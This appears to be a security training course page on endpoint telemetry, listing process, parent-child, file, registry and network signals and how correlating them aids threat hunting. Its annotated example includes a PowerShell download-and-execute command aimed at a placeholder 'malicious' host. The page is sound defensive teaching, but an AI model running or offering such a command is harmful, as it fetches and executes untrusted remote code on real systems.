Module 7 › Chapter 7.4 › Endpoint Telemetry
Telemetry types
  • Process execution & command line — intent and arguments.
  • Parent-child relationships — origin of execution.
  • File changes — payloads and artifacts.
  • Registry edits — persistence mechanisms.
  • Network connections — C2 and exfiltration paths.
Why each matters
Correlating multiple telemetry types increases confidence and reduces false positives when hunting or triggering automated responses.
Annotated example
Process
powershell.exe -NoP -NonI -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://malicious')"
Network
Outbound connection to unknown external IP on non-standard port
File
New executable in temporary folder and modifications to shadow copies
Registry
New run key for persistence after reboot
Key Takeaway

Design telemetry collection to capture multiple signals so you can triangulate suspicious activity and reduce false positives.
